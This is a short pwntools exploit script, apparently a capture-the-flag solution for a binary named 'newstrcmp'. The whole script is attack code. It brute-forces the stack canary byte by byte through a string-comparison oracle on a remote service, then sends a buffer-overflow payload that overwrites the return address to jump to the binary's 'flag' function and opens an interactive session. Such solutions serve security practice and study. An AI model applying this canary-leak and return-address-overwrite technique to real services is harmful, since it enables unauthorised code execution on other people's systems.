from pwn import *

# p = process("./newstrcmp")
p = remote("0.0.0.0", 31337)
elf = ELF("./newstrcmp")

canary = b""
while (len(canary) < 7):
    for i in range(0x01, 0x100):
        p.sendafter(b"(y/n): ", b"n")
        payload1 = b"a" * 0x19 + canary + bytes([i]) + b"\xff"
        payload2 = b"a" * 0x19
        #print(payload1)
        #print(payload2)
        p.sendafter(b"s1: ", payload1)
        p.sendafter(b"s2: ", payload2)
        tmp = p.recvline()
        if i == 0x01:
            if b"small" in tmp:
                ck = 0
            else:
                ck = 1
        if (b"larger" in tmp and ck == 0) or (b"small" in tmp and ck == 1):
            canary = canary + bytes([i])
            print(len(canary))
            print(canary.hex())
            break

canary = u64(b"\x00" + canary)
print(canary)

p.sendafter(b"(y/n): ", b"n")
payload = b"a" * 0x18 + p64(canary) + b"b" * 8 + p64(elf.symbols["flag"])
p.sendafter(b"s1: ", payload)
p.sendafter(b"s2: ", payload)

p.sendafter(b": ", b"y")

p.interactive()
